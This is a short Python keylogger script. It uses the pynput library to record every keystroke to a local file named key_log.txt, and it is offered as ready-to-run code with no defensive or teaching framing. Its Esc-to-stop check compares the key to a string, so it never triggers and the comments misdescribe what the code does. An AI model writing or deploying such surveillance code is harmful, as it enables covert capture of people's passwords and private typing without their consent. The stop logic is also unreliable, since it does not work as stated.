# Simple Keylogger Program
from pynput.keyboard import Listener

# File to store the logged keys
log_file = "key_log.txt"

# Function to write keystrokes to the file
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(str(key).replace("'", "") + "\n")  # Writing the key to the log file
    except Exception as e:
        print(f"Error: {e}")

# Function to stop the listener (optional, can remove this part)
def on_release(key):
    if key == 'Key.esc':
        # Stop the listener if 'Esc' is pressed (optional)

        return False

# Setting up the listener to monitor keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
